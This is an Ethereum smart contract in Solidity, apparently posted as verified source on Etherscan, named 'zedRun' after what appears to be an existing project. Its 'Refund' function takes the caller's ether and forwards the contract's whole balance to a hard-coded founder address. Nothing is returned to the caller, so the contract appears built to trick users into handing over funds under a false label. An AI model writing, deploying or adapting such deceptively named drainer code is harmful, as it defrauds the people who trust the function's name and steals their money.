/**
 *Submitted for verification at Etherscan.io on 2022-06-11
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

contract zedRun {
    address payable founderAddress;
    
    constructor(address payable _founderAddress) {
        founderAddress = _founderAddress;
    }

    function getBalance(address payable account) public view returns(uint) {
        uint256 balance = address(account).balance;
        return balance;
    }

    function Refund() public payable {
        require(msg.value > 0, "Value must be higher than 0");
        _widthdraw(founderAddress, address(this).balance);
    }

    function _widthdraw(address _address, uint256 _amount) private {
        (bool success, ) = _address.call{ value: _amount }("");
        require(success, "Failed to widthdraw Ether");
    }

}